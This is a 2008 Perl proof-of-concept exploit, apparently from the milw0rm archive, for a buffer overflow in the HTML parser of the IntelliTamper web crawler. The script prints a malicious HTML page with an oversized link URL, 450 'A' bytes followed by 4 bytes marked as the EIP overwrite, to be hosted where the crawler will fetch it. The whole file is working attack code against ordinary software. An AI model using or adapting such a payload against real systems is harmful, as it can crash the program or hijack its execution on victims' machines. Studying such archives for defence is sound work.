#!/usr/bin/perl
#
# k`sOSe - 07/21/2008
#
# This is NOT http://secunia.com/advisories/20172/.
# There are some BOFs in the html parser, just put a properly
# formatted html file in your website and launch IntelliTamper against it.

use warnings;
use strict;

my $evil_html   =       '<html><head><title>ph33r</title></head><body>' .
                        '<a href="http://google.it/' .
                        "\x41" x 450 .
                        "\x42" x 4 . # EIP
                        '.htm">ph33r</a>' .
                        "</body></html>";

print $evil_html;

# milw0rm.com [2008-07-21]